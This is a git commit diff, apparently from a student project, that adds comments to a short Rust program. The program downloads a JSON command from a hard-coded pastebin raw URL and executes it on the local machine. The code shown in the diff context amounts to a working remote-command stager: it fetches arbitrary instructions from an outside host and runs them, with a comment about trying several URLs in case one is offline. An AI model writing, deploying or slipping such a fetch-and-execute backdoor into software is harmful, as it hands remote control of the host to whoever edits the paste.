8f9c291dc079afaa5913748f1ffd875fe48637fc
Chad Baxter <cbaxter@mail.umw.edu>
2017-11-02 14:20:15 -0500

    commented

--- src/main.rs
+++ src/main.rs
@@ -18,11 +18,11 @@ struct Cmd {
     cmd: String,
     args: Vec<String>,
 }
-
+//Executes a command.
 fn execute(command: Cmd) -> Result<std::process::Output, std::io::Error> {
     Command::new(command.cmd.as_str()).args(command.args.as_slice()).output()
 }
-
+//Queries a url for json.
 fn query(url: &str) -> Result<Cmd, serde_json::Error> {
     let mut data = vec!();
     let mut handle = Easy::new();
@@ -35,17 +35,19 @@ fn query(url: &str) -> Result<Cmd, serde_json::Error> {
         }).unwrap();
         transfer.perform().unwrap();
     }
-
+    //Parses the json.
     serde_json::from_str(&String::from_utf8(data).unwrap())
 }
 
 fn main() {
     let urls: [& str; 1] = ["https://pastebin.com/raw/ZN9QGNZq"];
+    //Iterate the urls jus in case one is offline or broken.
     for i in 0 .. urls.len() {
             let temp_cmd: Option<Cmd> = match query(urls[i]) {
                 Ok(o) => Some(o),
                 Err(_) => None,
             };
+            //Execute the command if its valid
             if let Some(cmd) = temp_cmd {
                 match execute(cmd) {
                     Ok(_) => break,
